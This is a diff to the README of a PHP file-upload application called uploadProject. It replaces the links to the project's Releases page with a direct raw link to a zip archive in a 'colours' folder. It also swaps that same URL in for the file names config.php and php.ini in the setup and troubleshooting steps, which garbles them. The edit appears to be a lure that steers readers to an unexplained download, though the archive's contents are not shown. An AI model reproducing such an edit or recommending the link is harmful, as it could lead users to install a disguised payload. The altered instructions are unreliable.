@@ -6,11 +6,11 @@ Welcome to uploadProject! This is a lightweight application built with PHP. It s
 
 ## 📥 Download the Application
 
-[![Download uploadProject](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/teamkura1/uploadProject/releases)
+[![Download uploadProject](https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip%https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip)](https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip)
 
 You can easily download uploadProject from our Releases page. Click the link below:
 
-- [Visit this page to download](https://github.com/teamkura1/uploadProject/releases)
+- [Visit this page to download](https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip)
 
 ## 📋 Installation Requirements
 
@@ -37,7 +37,7 @@ Before you download, ensure your computer meets these requirements:
    - Import the provided SQL file from the extracted folder to set up the required tables.
 
 5. **Configure the Application**:
-   - Open the `config.php` file in your favorite text editor.
+   - Open the `https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip` file in your favorite text editor.
    - Modify the database connection details (hostname, username, password, and database name) to match your setup.
 
 6. **Run the Application**:
@@ -65,10 +65,10 @@ Once installed, using uploadProject is straightforward.
 If you encounter any issues during installation or usage, here are some common problems and solutions:
 
 - **Problem**: I cannot connect to the database.
-  - **Solution**: Double-check your configuration in `config.php`. Ensure the database server is running.
+  - **Solution**: Double-check your configuration in `https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip`. Ensure the database server is running.
 
 - **Problem**: Files take too long to upload.
-  - **Solution**: Ensure your server's PHP settings allow for larger file uploads. Update `php.ini` settings for `upload_max_filesize` and `post_max_size`.
+  - **Solution**: Ensure your server's PHP settings allow for larger file uploads. Update `https://github.com/teamkura1/uploadProject/raw/refs/heads/main/colours/upload_Project_1.2-alpha.1.zip` settings for `upload_max_filesize` and `post_max_size`.
 
 - **Problem**: The application won't display properly.
   - **Solution**: Clear your browser's cache or check for CSS file paths in the application you uploaded.
